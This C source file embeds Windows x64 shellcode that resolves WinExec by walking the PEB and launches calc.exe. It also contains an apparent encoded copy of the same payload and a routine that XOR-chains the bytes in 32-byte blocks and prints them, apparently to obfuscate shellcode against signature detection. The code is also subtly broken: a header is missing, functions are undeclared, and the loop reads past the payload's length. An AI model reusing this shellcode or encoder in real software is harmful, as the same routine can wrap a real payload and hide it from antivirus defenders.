#include <stdio.h>


const int BLOCK_SIZE = 32;
const int BLOCK_NUMBER = 6;
const int REAL_LENGTH = 169;
//const char PAYLOAD[] = {72, 49, 210, 101, 72, 139, 66, 96, 72, 139, 112, 24, 72, 139, 118, 32, 76, 139, 14, 77, 139, 9, 77, 139, 73, 32, 235, 99, 65, 139, 73, 60, 5, 0, 45, 36, 255, 3, 15, 97, 135, 194, 113, 215, 13, 0, 73, 109, 77, 68, 79, 198, 196, 17, 8, 0, 62, 0, 166, 98, 143, 104, 118, 195, 132, 121, 206, 183, 246, 3, 121, 143, 131, 72, 207, 135, 116, 75, 119, 124, 211, 51, 237, 15, 143, 108, 66, 74, 189, 45, 76, 195, 37, 23, 123, 198, 11, 61, 235, 179, 202, 220, 16, 195, 77, 203, 143, 71, 134, 204, 2, 116, 89, 163, 176, 201, 193, 191, 70, 74, 206, 134, 77, 195, 35, 55, 135, 120, 122, 237, 36, 207, 133, 191, 182, 178, 254, 53, 9, 62, 126, 93, 2, 252, 232, 62, 112, 46, 47, 174, 57, 238, 85, 195, 193, 13, 236, 139, 242, 147, 240, 103, 60, 194, 141, 4, 186, 0, 47, 255, 72, 49, 201, 81, 72, 185, 99, 97, 108, 99, 46, 101, 120, 101, 81, 72, 141, 12, 36, 72, 49, 210};
const unsigned char PAYLOAD[] = "\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2\x48\x83\xec\x20\x41\xff\xd6";



int main() {  
  
  unsigned char *ptr = (unsigned char*) calloc(BLOCK_SIZE*BLOCK_NUMBER,sizeof(unsigned char));
  for (int i = 0; i < BLOCK_NUMBER; i++) {
    char a[BLOCK_SIZE];
    for (int j = 0; j < BLOCK_SIZE; j++) {
        a[j] = PAYLOAD[j+(i*BLOCK_SIZE)];
    }
    for (int m = i; m < BLOCK_NUMBER; m++) {
      decode(a, ptr+(m*BLOCK_SIZE));
    }
  }
  check(ptr);
  return 0;
}


void decode(char k[], char * p) {
  for (int i = 0; i < BLOCK_SIZE; i++) {
    p[i] ^= k[i];
  }
}


void check(unsigned char *p){
  for (int i = 0; i < BLOCK_SIZE*BLOCK_NUMBER; i++) {
    printf("%x", p[i]);
  }
}